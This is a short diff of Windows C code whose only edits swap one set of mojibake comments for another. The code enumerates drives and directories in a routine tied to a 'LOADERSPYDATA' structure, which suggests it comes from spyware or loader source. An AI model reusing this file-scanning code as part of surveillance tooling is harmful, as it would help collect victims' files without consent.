@@ -49,7 +49,7 @@ static bool ListDir(LPWSTR pDir, LOADERSPYDATA *plsd)
 {
   WCHAR Path[MAX_PATH];
   Fs::_pathCombine(Path, pDir, L"*");
-  Path[MAX_PATH - 1] = 0; //pС—Р…pС—Р… pС—Р…pС—Р…pС—Р…pС—Р…pС—Р…pС—Р… pС—Р…pС—Р…pС—Р…pС—Р…pС—Р…pС—Р…
+  Path[MAX_PATH - 1] = 0; //pїЅpїЅ pїЅpїЅpїЅpїЅpїЅpїЅ pїЅpїЅpїЅpїЅpїЅpїЅ
   WIN32_FIND_DATAW wfd;
   HANDLE hS = CWA(kernel32, FindFirstFileW)(Path, &wfd);
   if(hS == INVALID_HANDLE_VALUE)return false;
@@ -98,7 +98,7 @@ static void WINAPI FSProc(LOADERSPYDATA *plsd)
   {
     DWORD dwTmp;
 
-    //pС—Р…pС—Р…pС—Р…pС—Р… pС—Р…pС—Р…pС—Р…pС—Р…pС—Р…pС—Р…pС—Р…
+    //pїЅpїЅpїЅpїЅ pїЅpїЅpїЅpїЅpїЅpїЅpїЅ
     //CWA (kernel32, EnterCriticalSection) (& csfs);
     //dwTmp = dwQuestsCount;
     //CWA (kernel32, LeaveCriticalSection) (& csfs);
@@ -106,7 +106,7 @@ static void WINAPI FSProc(LOADERSPYDATA *plsd)
 
     WCHAR Path[8];
     DWORD dwDrives = CWA(kernel32, GetLogicalDrives)();
-    for(BYTE i = 2/*пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ fdd* /; i < 32; i++)if(dwDrives & (1 << i))
+    for(BYTE i = 2/*���������� fdd* /; i < 32; i++)if(dwDrives & (1 << i))
     {
       Path[0] = i + 'A';
       Path[1] = ':';
